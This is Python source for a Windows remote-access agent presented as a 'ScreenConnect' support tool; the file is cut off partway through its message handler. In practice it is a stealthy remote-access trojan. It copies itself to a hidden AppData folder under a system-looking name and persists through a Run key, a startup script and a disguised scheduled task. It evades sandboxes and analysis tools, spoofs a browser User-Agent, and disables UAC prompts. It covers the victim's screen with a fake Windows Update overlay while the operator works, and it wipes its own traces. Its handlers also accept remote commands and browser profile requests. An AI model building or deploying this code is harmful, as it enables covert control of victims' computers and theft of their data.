"""
ScreenConnect Client Agent v2

Full remote management agent with:
  - Binary WebSocket frame streaming (no base64 overhead)
  - Adaptive JPEG quality based on frame rate
  - File browser, upload, and download
  - Remote command execution with streaming output
  - System info, process management, clipboard sync

Build:  pyinstaller --onefile --noconsole --name ScreenConnect-Agent agent.py
"""
import argparse
import base64
import json
import io
import logging
import os
import platform
import shlex
import shutil
import signal
import socket
import sqlite3
import struct
import subprocess
import sys
import tempfile
import threading
import time
import tkinter as tk
import uuid
import winreg
import zlib
import ctypes
from ctypes import wintypes
from pathlib import Path
from tkinter import ttk, messagebox

import cv2
import mss
import numpy as np
import pyautogui
import websocket

# Optional imports
try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False

try:
    import pyperclip
    HAS_PYPERCLIP = True
except ImportError:
    HAS_PYPERCLIP = False

# Disable pyautogui failsafe
pyautogui.FAILSAFE = False
pyautogui.PAUSE = 0

# =============================================================================
# Mode Configuration
# =============================================================================
# DEV_MODE=True  → Full logging, skip VM checks, ws:// allowed, verbose output
# DEV_MODE=False → Silent (no log file), full stealth, wss:// enforced
DEV_MODE = True

# Admin Elevation
# EXTRA STEALTH: Set to True to prompt for Admin rights (UAC) on first run.
# Allows for Scheduled Task persistence and system-wide control.
ADMIN_RIGHTS = True

# Server URLs
DEV_SERVER_URL = "http://localhost:8000"
PROD_SERVER_URL = "https://screen-connect.34.214.40.93.sslip.io"  # <-- CHANGE THIS
DEFAULT_SERVER_URL = DEV_SERVER_URL if DEV_MODE else PROD_SERVER_URL

# Spoofed User-Agent (Microsoft Edge on Windows 11)
SPOOFED_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0"
)

# =============================================================================
# Logging Setup
# =============================================================================
def init_logging():
    """Initialize logging based on DEV_MODE."""
    root = logging.getLogger()
    # Clear any existing handlers
    if root.handlers:
        for handler in root.handlers[:]:
            root.removeHandler(handler)

    if not DEV_MODE:
        # PRODUCTION: Complete silence — no file, no stdout
        logging.basicConfig(level=logging.CRITICAL, handlers=[logging.NullHandler()])
        return True

    # DEV MODE: Full logging to file + stdout
    log_path = os.path.join(os.environ.get("LOCALAPPDATA", "."), "agent_debug.log")
    for _ in range(5):
        try:
            logging.basicConfig(
                level=logging.INFO,
                format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                handlers=[
                    logging.FileHandler(log_path),
                    logging.StreamHandler(sys.stdout)
                ]
            )
            return True
        except (PermissionError, IOError):
            time.sleep(0.5)

    # Fallback to stdout only
    logging.basicConfig(level=logging.INFO, handlers=[logging.StreamHandler(sys.stdout)])
    return False

init_logging()
logger = logging.getLogger("ScreenConnectAgent")

# Binary message types
MSG_TYPE_FRAME = 0x01
MSG_TYPE_FILE_CHUNK = 0x02
MSG_TYPE_CAMERA_SNAP = 0x03
MSG_TYPE_TILE = 0x04
MSG_TYPE_UPLOAD_CHUNK = 0x05
PROTOCOL_VERSION = 1

# Stealth Settings
APP_DATA_SUBDIR = "SystemDiagnostics"
MUTEX_NAME = "Global\\ScreenConnectAgent_v2_9a5301fd"
REG_STARTUP_NAME = "WindowsSystemDiagnostics"
SCHEDULED_TASK_NAME = "Microsoft\\Windows\\Maintenance\\SystemHealthMonitor"

# Compression settings
TILE_SIZE = 128
KEYFRAME_INTERVAL = 30.0 # Full refresh every 30 seconds (adaptive)
TIMEOUT_SEND = 1.0       # Seconds to wait for a send before skipping

# Dangerous commands blocklist
BLOCKED_COMMANDS = {
    "format", "del /s", "rd /s", "rmdir /s", "rm -rf",
    "mkfs", "dd if=", "shutdown", "reboot", "halt",
}

# File transfer chunk size
CHUNK_SIZE = 64 * 1024  # 64KB

# Analysis tools to detect (sandbox/reverse engineering)
ANALYSIS_TOOLS = {
    "wireshark.exe", "procmon.exe", "procmon64.exe", "processhacker.exe",
    "x64dbg.exe", "x32dbg.exe", "ollydbg.exe", "ida.exe", "ida64.exe",
    "fiddler.exe", "charles.exe", "httpdebuggerpro.exe",
    "pestudio.exe", "die.exe", "dumpcap.exe", "tcpdump.exe",
    "autoruns.exe", "autorunsc.exe",
}


# =============================================================================
# Core Agent
# =============================================================================

# Base64 encoded Windows Update screen (480p JPEG)
PRIVACY_BG_B64 = "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAA0JCgsKCA0LCgsODg0PEyAVExISEyccHhcgLioKDAsKCwwOExUQDRhNExkwHBofIyVmJicoNDUuGxs0LDM3JDZmxv8AACEAAbAA4AEAAREAIAAAAF/9sAQwEIDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0N/8AAEQgB4ANpAwEiAAIRAQMRAf/EAB8AAAEFAQEBAQEBAAAAAAAAAAABAgMEBQYHCAkKC//EALUQAAIBAwMCBAMFBQQEAAABfQECAwAEEQUSITFBBhNRYQcicRQygZGhCCNCscEVUtHwJDNicoIJChYXGBkaJSYnKCkqNDU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6g4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2drh4uPk5ebn6Onq8fLz9PX29/j5+v/EAB8BAAMBAQEBAQEBAQEAAAAAAAABAgMEBQYHCAkKC//EALURAAIBAgQEAwQHBQQEAAECBA14AQAhEDEB8BEQUmE1YhYzQhJlYnKCkqNDU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6g4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2drh4uPk5ebn6Onq8fLz9PX29/j5+v/aAAwDAQACEQMRAD8A9UoqOkkrAAoooxigAopeOaTtQAGiiloASiiloASiiimAlLSUtACUUtFACUUUUAFFFFACUUUUAdBRSUVgAUUlFABSdKWkoATvS0nrS0AGetN6Cl6GkoAPxpO3pS/zpP4RQAnoelBpPQUGgBfbvSf1o96TnvQAfpScZNH0ooAPUUnU+1L1zSfXNAAOetHoBR9Pxozz60AA6mjp357Uf19qCOnrTAByKKPeigA6UUetFADevWnt3pnrT6AKFFFZArSiiisACiiigAooooAKKKKACiiigDtKKKKwAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKAO0ooorAAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKAO0ooorAAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooA7SiiisACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooA7SiiisACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigDtKKKKwAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigDtKKKKwAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKAO0ooorAAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKAO0ooorAAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooA7SiiisACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooA7SiiisACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigDtKKKKwAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigDtKKKKwAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKAO0ooorAAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKAO0ooorAAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooA7SiiisACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooA7SiiisACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigDtKKKKwAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigDtKKKKwAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKAO0ooorAAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKAO0ooorAAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooA7SiiisACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooA7SiiisACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigDtKKKKwAKKKKACiiigAxRSUveigBKXpRRQAUlLRQAmaXtSUtABRSUUALSUtJQAUUUUAFFFFABRRRQAUUUUAf/Z"

# =============================================================================
# Stealth & Persistence Manager
# =============================================================================

class StealthManager:
    """Handles anti-VM, silence, persistence, and self-destruction."""

    @staticmethod
    def is_admin():
        """Check if the current process has administrative privileges."""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            return False

    @staticmethod
    def auto_elevate():
        """
        Attempt to elevate to Administrator if ADMIN_RIGHTS is enabled.
        Self-restarts with 'runas' verb. Includes a fallback to user mode.
        """
        if not ADMIN_RIGHTS or StealthManager.is_admin():
            return

        # If we reach here, we are not admin but want to be.
        # Check if we were already told NOT to elevate (to avoid infinite loops)
        if "--no-elevate" in sys.argv:
            return

        logger.info("Attempting Smart Elevation (UAC prompt)...")
        
        try:
            # Re-run the current executable with the 'runas' verb (triggers UAC)
            # We add --no-elevate to the new process so if it fails or the user 
            # clicks "No" later, we don't loop forever.
            current_exe = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
            params = " ".join(sys.argv[1:] + ["--no-elevate"])
            
            # 1 = SW_SHOWNORMAL
            ret = ctypes.windll.shell32.ShellExecuteW(None, "runas", current_exe, params, None, 1)
            
            if int(ret) > 32:
                # Successfully launched elevated process, so this one can exit.
                logger.info("Elevation successful. Handing off to admin instance.")
                os._exit(0)
            else:
                logger.warning(f"Elevation failed (ShellExecute ret={ret}). Continuing in user mode.")
        except Exception as e:
            logger.warning(f"Smart Elevation failed: {e}. Continuing in user mode.")

    @staticmethod
    def elevate_silent():
        """Modify registry for silent admin consent (if already admin)."""
        if not StealthManager.is_admin():
            return
        try:
            # HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
            # ConsentPromptBehaviorAdmin = 0 (Elevate without prompting)
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
            logger.info("Silent Admin consent enabled")
        except Exception as e:
            logger.error(f"Failed to enable silent consent: {e}")

    @staticmethod
    def hide_console():
        """Hides the console window if it's visible."""
        try:
            kernel32 = ctypes.windll.kernel32
            user32 = ctypes.windll.user32
            hwnd = kernel32.GetConsoleWindow()
            if hwnd:
                user32.ShowWindow(hwnd, 0) # SW_HIDE
        except Exception:
            pass

    @staticmethod
    def prevent_multiple_instances():
        """Ensures only one instance is running per machine."""
        import time
        kernel32 = ctypes.windll.kernel32
        
        # Retry loop for seamless hand-off from desktop -> stealth
        for _ in range(5):
            kernel32.CreateMutexW(None, False, MUTEX_NAME)
            last_err = kernel32.GetLastError()
            if last_err != 183: # ERROR_ALREADY_EXISTS
                logger.info("Mutex acquired")
                return 
            time.sleep(1) # wait for parent to exit

        logger.warning("Another instance is already running. Exiting.")
        sys.exit(0)

    @staticmethod
    def check_vm():
        """
        Check for common virtualization and sandbox indicators.
        Skipped entirely in DEV_MODE.
        """
        if DEV_MODE:
            return False

        score = 0  # Accumulate suspicion — threshold-based instead of instant exit

        try:
            # 1. MAC Address Prefix Check (OUI)
            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8*6, 8)][::-1])
            vm_prefixes = [
                "08:00:27", "00:05:69", "00:0c:29", "00:50:56",
                "00:15:5d", "00:1c:42", "00:16:3e", "00:03:ff",
            ]
            for prefix in vm_prefixes:
                if mac.lower().startswith(prefix.lower()):
                    score += 3
                    break
        except Exception:
            pass

        try:
            # 2. BIOS / System Info Check
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"DESCRIPTION\System\BIOS", 0, winreg.KEY_READ)
            vendor, _ = winreg.QueryValueEx(key, "SystemManufacturer")
            winreg.CloseKey(key)
            vm_vendors = ["virtualbox", "vmware", "qemu", "hyper-v", "parallels", "xen"]
            if any(v in vendor.lower() for v in vm_vendors):
                score += 3
        except Exception:
            pass

        try:
            # 3. Analysis tool detection — check for running forensic/RE tools
            if HAS_PSUTIL:
                running = {p.name().lower() for p in psutil.process_iter(['name'])}
                detected = running & ANALYSIS_TOOLS
                if detected:
                    score += 4
        except Exception:
            pass

        try:
            # 4. Disk size check — sandboxes often have < 80GB total
            if HAS_PSUTIL:
                total_disk = sum(
                    psutil.disk_usage(p.mountpoint).total
                    for p in psutil.disk_partitions()
                    if 'cdrom' not in p.opts.lower() and 'removable' not in p.opts.lower()
                )
                if total_disk < 80 * (1024 ** 3):  # < 80 GB
                    score += 2
        except Exception:
            pass

        try:
            # 5. Low uptime — freshly booted sandbox
            if HAS_PSUTIL:
                boot_time = psutil.boot_time()
                uptime_minutes = (time.time() - boot_time) / 60
                if uptime_minutes < 10:
                    score += 2
        except Exception:
            pass

        try:
            # 6. Low recent file count — real users have hundreds
            recent_path = os.path.join(os.environ.get("APPDATA", ""),
                                       r"Microsoft\Windows\Recent")
            if os.path.isdir(recent_path):
                recent_count = len(os.listdir(recent_path))
                if recent_count < 15:
                    score += 2
        except Exception:
            pass

        # Threshold: score >= 5 = likely a VM/sandbox
        if score >= 5:
            logger.warning(f"VM/Sandbox detected (score={score})")
            return True
        return False

    @staticmethod
    def get_machine_id():
        """Get or generate a persistent hardware-bound ID."""
        try:
            # Try getting machine GUID from registry
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography", 0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY)
            guid, _ = winreg.QueryValueEx(key, "MachineGuid")
            winreg.CloseKey(key)
            return guid
        except Exception:
            # Fallback to hashed MAC address
            return str(uuid.uuid5(uuid.NAMESPACE_DNS, str(uuid.getnode())))

    @staticmethod
    def relocate_agent():
        """Moves the agent to a hidden AppData folder and hides the file."""
        try:
            current_exe = sys.executable 
            if getattr(sys, 'frozen', False):
                current_exe = sys.executable
            else:
                current_exe = os.path.abspath(sys.argv[0])

            app_data = os.environ.get("LOCALAPPDATA", os.path.expanduser("~\\AppData\\Local"))
            target_dir = os.path.join(app_data, APP_DATA_SUBDIR)
            target_exe_name = "WinSystemDiagnostics.exe" if current_exe.endswith(".exe") else "agent.py"
            target_path = os.path.join(target_dir, target_exe_name)

            logger.info(f"Relocation check: Current={current_exe} Target={target_path}")

            if not os.path.exists(target_dir):
                os.makedirs(target_dir, exist_ok=True)
                ctypes.windll.kernel32.SetFileAttributesW(target_dir, 0x02) # HIDDEN

            # If we are NOT running from the target path, copy and launch
            current_norm = os.path.normpath(current_exe).lower()
            target_norm = os.path.normpath(target_path).lower()

            if current_norm != target_norm:
                logger.info(f"Copying agent to stealth location: {target_path}")
                
                copy_success = False
                # If the target already exists and is locked, kill any running instance first
                if os.path.exists(target_path):
                    try:
                        # Kill any running instance of the target EXE
                        subprocess.run(
                            ["taskkill", "/F", "/IM", os.path.basename(target_path)],
                            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
                        )
                        time.sleep(1)  # Give OS time to release the file
                    except Exception:
                        pass
                
                # Retry the copy a few times (file might still be releasing)
                for attempt in range(5):
                    try:
                        shutil.copy2(current_exe, target_path)
                        ctypes.windll.kernel32.SetFileAttributesW(target_path, 0x02) # HIDDEN
                        copy_success = True
                        logger.info(f"Copy succeeded on attempt {attempt + 1}")
                        break
                    except PermissionError:
                        logger.warning(f"Copy attempt {attempt + 1}/5 failed (file locked), retrying...")
                        time.sleep(2)
                    except Exception as e:
                        logger.error(f"Copy failed (non-permission): {e}")
                        break
                
                if not copy_success:
                    # If file already exists at target, try to launch it anyway
                    # (it's probably still a valid copy from a previous deployment)
                    if os.path.exists(target_path):
                        logger.warning("Copy failed but target EXE exists. Launching existing copy.")
                    else:
                        logger.error("Copy failed and no existing target. Cannot relocate.")
                        os._exit(1)
                
                # Launch the stealth copy using ShellExecuteW for TOTAL detachment
                # This ensures the new process has NO file handle ties to this one.
                logger.info("Handing off to stealth instance via ShellExecuteW...")
                try:
                    shell32 = ctypes.windll.shell32
                    # SW_HIDE = 0
                    params = f'--cleanup "{current_exe}"'
                    result = shell32.ShellExecuteW(None, "open", target_path, params, None, 0)
                    if result <= 32:
                        logger.error(f"ShellExecuteW failed with code: {result}")
                except Exception as e:
                    logger.error(f"Hand-off failed: {e}")

                # EXTREME HARD EXIT. This process must die immediately to release the Desktop file lock.
                # Explicitly shutdown logging to release the file handle for the new process.
                logging.shutdown()
                os._exit(0)
            
            logger.info("Running from stealth location.")
            return target_path
        except Exception as e:
            logger.error(f"Relocation failed: {e}")
            return None

    @staticmethod
    def add_to_startup(executable_path):
        """Persists the agent via Registry Run key, Startup folder .bat, and Scheduled Task."""
        try:
            # 1. Registry (HKCU) - Doesn't require admin
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, REG_STARTUP_NAME, 0, winreg.REG_SZ, f'"{executable_path}"')
            winreg.CloseKey(key)
        except Exception as e:
            logger.error(f"Registry persistence failed: {e}")

        try:
            # 2. Startup Folder .bat (Redundancy)
            startup_path = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
            bat_path = os.path.join(startup_path, f"{REG_STARTUP_NAME}.bat")
            with open(bat_path, "w") as f:
                f.write(f'start "" "{executable_path}"\nexit')
            ctypes.windll.kernel32.SetFileAttributesW(bat_path, 0x02)  # HIDDEN
        except Exception as e:
            logger.error(f"Startup folder persistence failed: {e}")

        try:
            # 3. Scheduled Task — hidden under Microsoft\Windows\Maintenance
            # Runs on user logon, with highest privileges if admin
            rl = "/rl HIGHEST" if StealthManager.is_admin() else ""
            cmd = (
                f'schtasks /create /tn "{SCHEDULED_TASK_NAME}" '
                f'/tr "\"{executable_path}\"" /sc ONLOGON {rl} /f'
            )
            result = subprocess.run(
                cmd, shell=True, capture_output=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            if result.returncode == 0:
                logger.info("Scheduled task persistence enabled")
            else:
                logger.warning(f"Scheduled task creation failed: {result.stderr.decode(errors='ignore').strip()}")
        except Exception as e:
            logger.error(f"Scheduled task persistence failed: {e}")

        logger.info("Persistence enabled (Registry + Startup + Scheduled Task)")

    @staticmethod
    def self_destruct():
        """Wipes ALL evidence: registry, startup, scheduled task, log, and agent directory."""
        logger.warning("NUCLEAR OPTION: Self-destructing...")
        try:
            # 1. Remove Registry Key
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(key, REG_STARTUP_NAME)
                winreg.CloseKey(key)
            except Exception: pass

            # 2. Remove Startup .bat
            try:
                startup_path = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
                bat_path = os.path.join(startup_path, f"{REG_STARTUP_NAME}.bat")
                if os.path.exists(bat_path): os.remove(bat_path)
            except Exception: pass

            # 3. Remove Scheduled Task
            try:
                subprocess.run(
                    f'schtasks /delete /tn "{SCHEDULED_TASK_NAME}" /f',
                    shell=True, capture_output=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            except Exception: pass

            # 4. Remove log file
            try:
                log_path = os.path.join(os.environ.get("LOCALAPPDATA", "."), "agent_debug.log")
                if os.path.exists(log_path):
                    logging.shutdown()
                    os.remove(log_path)
            except Exception: pass

            # 5. Create cleanup script to delete agent directory and itself
            app_data = os.environ.get("LOCALAPPDATA", os.path.expanduser("~\\AppData\\Local"))
            target_dir = os.path.join(app_data, APP_DATA_SUBDIR)
            
            cleanup_bat = os.path.join(tempfile.gettempdir(), "cleanup.bat")
            with open(cleanup_bat, "w") as f:
                f.write(f'@echo off\n')
                f.write(f'timeout /t 3 /nobreak > nul\n')
                f.write(f'rd /s /q "{target_dir}"\n')
                f.write(f'del "{cleanup_bat}"\n')
            
            subprocess.Popen(["cmd.exe", "/c", cleanup_bat], creationflags=subprocess.CREATE_NO_WINDOW)
            
            # 6. Exit
            os._exit(0)
        except Exception as e:
            logger.error(f"Self-destruct failed: {e}")
            sys.exit(0)

class PrivacyOverlay:
    """Animated fake Windows Update screen."""
    def __init__(self, root):
        self.root = root 
        self.overlay = None
        self.active = False
        self._angle = 0
        self._dots = []
        self._center = (0, 0)
        self._bg_img = None
        self.capture_exclusion_enabled = False

    def start(self):
        """Must be called from transition state on the main GUI thread."""
        self.overlay = tk.Toplevel(self.root)
        # Fullscreen, borderless, top-most
        self.overlay.attributes("-topmost", True)
        self.overlay.attributes("-fullscreen", True)
        self.overlay.overrideredirect(True)
        self.overlay.configure(bg="#00185a") # Windows blue
        self.overlay.withdraw() # Start hidden
        self.overlay.grab_set()
        self.overlay.update_idletasks()
        self.capture_exclusion_enabled = self._enable_capture_exclusion()

        self.canvas = tk.Canvas(self.overlay, bg="#00185a", highlightthickness=0)
        self.canvas.pack(fill="both", expand=True)

        w = self.overlay.winfo_screenwidth()
        h = self.overlay.winfo_screenheight()
        self._center = (w // 2, h // 2 + 150)

        # Load background
        try:
            img_data = base64.b64decode(PRIVACY_BG_B64)
            self._bg_img = tk.PhotoImage(data=img_data)
            self.canvas.create_image(w // 2, h // 2, image=self._bg_img)
        except Exception as e:
            logger.error(f"Overlay image error: {e}")

        # Create dots
        for i in range(6):
            dot = self.canvas.create_oval(0, 0, 10, 10, fill="white", outline="")
            self._dots.append(dot)

        self.active = True
        self._animate()

    def _enable_capture_exclusion(self):
        """
        Keep overlay visible on local monitor while excluding it from screen capture.
        Works on modern Windows builds via SetWindowDisplayAffinity.
        """
        if platform.system() != "Windows" or not self.overlay:
            return False

        try:
            user32 = ctypes.windll.user32
            hwnd = wintypes.HWND(self.overlay.winfo_id())
            WDA_EXCLUDEFROMCAPTURE = 0x00000011
            WDA_MONITOR = 0x00000001

            ok = user32.SetWindowDisplayAffinity(hwnd, WDA_EXCLUDEFROMCAPTURE)
            if not ok:
                # Fallback for older Windows versions.
                ok = user32.SetWindowDisplayAffinity(hwnd, WDA_MONITOR)

            if ok:
                logger.info("Privacy overlay excluded from capture via display affinity")
                return True
        except Exception as e:
            logger.debug(f"Display affinity unsupported: {e}")

        return False

    def _animate(self):
        if not self.active or not self.overlay: return
        
        radius = 35
        # Draw 6 dots in a circular path
        for i, dot in enumerate(self._dots):
            theta = (self._angle + (i * 25)) * (3.14159 / 180)
            x = self._center[0] + radius * np.cos(theta)
            y = self._center[1] + radius * np.sin(theta)
            self.canvas.coords(dot, x-4, y-4, x+4, y+4)
            # Fade effect for trailing dots
            level = hex(int(255 * (1 - (i/8))))[2:].zfill(2)
            self.canvas.itemconfig(dot, fill=f"#{level}{level}{level}")

        self._angle = (self._angle + 6) % 360
        self.overlay.after(30, self._animate)

    def show(self):
        """Thread-safe show command."""
        if self.overlay:
            self.overlay.after(0, self._show_safe)

    def _show_safe(self):
        if self.overlay:
            self.overlay.deiconify()
            self.overlay.lift()
            self.overlay.attributes("-topmost", True)
            self.overlay.update_idletasks()

    def hide(self):
        """Thread-safe hide command."""
        if self.overlay:
            self.overlay.after(0, self._hide_safe)

    def _hide_safe(self):
        if self.overlay:
            self.overlay.withdraw()
            self.overlay.update_idletasks()

    def stop(self):
        self.active = False
        if self.overlay:
            self.overlay.destroy()
            self.overlay = None

class ScreenConnectAgent:
    """Client-side agent for screen sharing and remote management."""

    def __init__(self, server_url, session_id, token, fps=8, quality=50,
                 max_width=1920, on_status=None):
        self.server_url = server_url.rstrip("/")
        self.session_id = session_id
        self.token = token
        self.fps = fps
        self.quality = quality
        self.max_quality = quality
        self.min_quality = max(10, quality // 3)
        self.max_width = max_width
        self.on_status = on_status or (lambda *a: None)

        self.ws = None
        self.running = False
        self.connected = False
        self.capture_thread = None
        self.last_frame_crc = None
        self.last_block_hashes = {}  # (row, col) -> hash
        self.last_keyframe_time = 0
        self._send_lock = threading.Lock()
        self._last_send_time = 0
        self._last_send_duration = 0
        self._stop_event = threading.Event()

        # Privacy screen
        self.privacy_active = False
        self.privacy_overlay = None
        self.ui_root = None # Assigned by GUI thread

        # Active subprocesses for remote terminal
        self._active_commands = {}  # command_id -> Popen
        # Active file transfers
        self._active_transfers = {}
        # Current working directory for the remote terminal
        self.terminal_cwd = os.path.expanduser("~")

        # Performance: background metrics to avoid blocking WS handlers
        self._metrics = {
            "cpu_percent": 0.0,
            "memory_percent": 0.0,
            "memory_used": 0,
            "memory_total": 0,
            "disks": [],
            "network_interfaces": [],
        }
        self._metrics_lock = threading.Lock()
        self._metrics_thread = None
        self.streaming_enabled = True

    @property
    def ws_url(self):
        url = self.server_url.replace("http://", "ws://").replace("https://", "wss://")
        return (
            f"{url}/ws/session/{self.session_id}/"
            f"?token={self.token}&role=client"
        )

    def start(self):
        self.running = True
        self.on_status("connecting", "Connecting to server...")
        logger.info(f"Connecting to {self.ws_url}")

        # Spoofed headers to blend in with normal browser traffic
        ws_headers = {
            "User-Agent": SPOOFED_USER_AGENT,
            "Accept-Language": "en-US,en;q=0.9",
        }

        self.ws = websocket.WebSocketApp(
            self.ws_url,
            on_open=self._on_open,
            on_message=self._on_message,
            on_data=self._on_data,
            on_error=self._on_error,
            on_close=self._on_close,
            header=ws_headers,
        )

        self._stop_event.clear()

        # Start background metrics if psutil is available
        if HAS_PSUTIL:
            self._metrics_thread = threading.Thread(target=self._metric_loop, daemon=True)
            self._metrics_thread.start()

        while self.running and not self._stop_event.is_set():
            try:
                # Use a timeout so we can check self.running periodically
                self.ws.run_forever(ping_interval=15, ping_timeout=10)
            except Exception as e:
                logger.error(f"WebSocket error: {e}")

            if self.running and not self._stop_event.is_set():
                self.on_status("reconnecting", "Reconnecting in 3s...")
                # Use wait on event instead of sleep for instant wakeup on stop
                if self._stop_event.wait(3):
                    break

    def stop(self):
        self.running = False
        self._stop_event.set()
        
        # Notify server that session has ended (if connected)
        if self.connected and self.ws:
            try:
                # Direct send with a very short timeout
                self._send_json({"type": "session_end"})
            except Exception:
                pass
        
        self.connected = False
        
        # Kill any active commands
        for cmd_id, proc in list(self._active_commands.items()):
            try:
                proc.kill()
            except Exception:
                pass
        self._active_commands.clear()

        # Shutdown WebSocket socket immediately to break any blocking calls
        if self.ws and self.ws.sock:
            try:
                self.ws.sock.shutdown(socket.SHUT_RDWR)
                self.ws.sock.close()
            except Exception:
                pass
        
        if self.ws:
            self.ws.close()
            
        self.on_status("disconnected", "Disconnected")
        logger.info("Agent stopped")

    # -- WebSocket callbacks ---------------------------------------------------

    def _on_open(self, ws):
        self.connected = True
        self.on_status("connected", "Connected — sharing screen")
        logger.info("Connected to server")
        self._send_screen_info()
        self.capture_thread = threading.Thread(target=self._capture_loop, daemon=True)
        self.capture_thread.start()

        # Init privacy overlay if UI root is provided (GUI thread safety)
        if self.ui_root:
            def _launch_overlay():
                self.privacy_overlay = PrivacyOverlay(self.ui_root)
                self.privacy_overlay.start()
            self.ui_root.after(0, _launch_overlay)

    def _on_message(self, ws, message):
        try:
            data = json.loads(message)
            msg_type = data.get("type")

            # Input handlers
            if msg_type == "mouse_click":
                self._handle_mouse_click(data)
            elif msg_type == "mouse_move":
                self._handle_mouse_move(data)
            elif msg_type == "mouse_down":
                self._handle_mouse_down(data)
            elif msg_type == "mouse_up":
                self._handle_mouse_up(data)
            elif msg_type == "key_press":
                self._handle_key_press(data)
            elif msg_type == "scroll":
                self._handle_scroll(data)

            # Session lifecycle
            elif msg_type == "session_ended":
                logger.info("Session ended by agent")
                self.on_status("ended", "Session ended by support agent")
                self.stop()
            elif msg_type == "pong":
                pass

            # File management
            elif msg_type == "file_list":
                self._handle_file_list(data)
            elif msg_type == "file_download_request":
                self._handle_file_download(data)
            elif msg_type == "file_upload_start":
                self._handle_file_upload_start(data)
            elif msg_type == "file_upload_chunk":
                self._handle_file_upload_chunk(data)
            elif msg_type == "file_upload_complete":
                self._handle_file_upload_complete(data)
            elif msg_type == "file_delete":
                self._handle_file_delete(data)

            # Remote terminal
            elif msg_type == "command_run":
                self._handle_command_run(data)
            elif msg_type == "command_kill":
                self._handle_command_kill(data)

            # System tools
            elif msg_type == "system_info_request":
                self._handle_system_info()
            elif msg_type == "browser_list_request":
                self._handle_browser_list_request(data)
            elif msg_type == "browser_profile_request":
                self._handle_browser_profile_request(data)
            elif msg_type == "process_list_request":
                self._handle_process_list()
            elif msg_type == "process_kill":
                self._handle_process_kill(data)
            elif msg_type == "clipboard_get":
                self._handle_clipboard_get()
            elif msg_type == "clipboard_set":
                self._handle_clipboard_set(data)
            elif msg_type == "bandwidth_mode":
                self._handle_bandwidth_mode(data)
            elif msg_type == "streaming_toggle":
                self._handle_streaming_toggle(data)
            elif msg_type == "system_action":
                self._handle_system_action(data)
